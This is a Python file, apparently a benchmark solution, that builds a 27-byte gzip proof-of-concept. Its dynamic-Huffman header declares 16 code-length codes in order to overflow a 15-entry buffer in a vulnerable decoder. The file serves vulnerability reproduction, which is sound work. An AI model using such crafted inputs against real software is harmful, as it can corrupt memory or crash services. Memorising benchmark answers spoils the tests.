import struct

class Solution:
    class _BitStream:
        def __init__(self):
            self.data = bytearray()
            self.current_byte = 0
            self.bit_pos = 0

        def write_bits(self, value: int, num_bits: int):
            for i in range(num_bits):
                bit = (value >> i) & 1
                self.current_byte |= (bit << self.bit_pos)
                self.bit_pos += 1
                if self.bit_pos == 8:
                    self.data.append(self.current_byte)
                    self.current_byte = 0
                    self.bit_pos = 0

        def get_bytes(self) -> bytes:
            if self.bit_pos > 0:
                self.data.append(self.current_byte)
            return bytes(self.data)

    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # GZIP header (10 bytes)
        gzip_header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x02\xff'

        stream = self._BitStream()
        
        # DEFLATE block header: 17 bits
        # BFINAL=1, BTYPE=2 (dynamic Huffman)
        stream.write_bits(1, 1)
        stream.write_bits(2, 2)
        
        # HLIT=257 (encoded as 0), HDIST=1 (encoded as 0)
        stream.write_bits(0, 5)
        stream.write_bits(0, 5)
        
        # HCLEN=16 (encoded as 12). The decoder will attempt to read
        # HCLEN + 4 = 16 code lengths, overflowing a buffer of size 15.
        stream.write_bits(12, 4)
        
        # 16 code lengths, 3 bits each, values don't matter: 48 bits
        for _ in range(16):
            stream.write_bits(0, 3)
            
        # Total DEFLATE stream length is 17 + 48 = 65 bits, which fits in 9 bytes.
        deflate_stream = stream.get_bytes()

        # GZIP trailer (8 bytes): CRC32 and ISIZE of uncompressed data.
        # Both are 0 for empty data, packed as little-endian unsigned integers.
        gzip_trailer = struct.pack('<II', 0, 0)

        # Total PoC length = 10 (header) + 9 (deflate) + 8 (trailer) = 27 bytes.
        poc = gzip_header + deflate_stream + gzip_trailer
        
        return poc
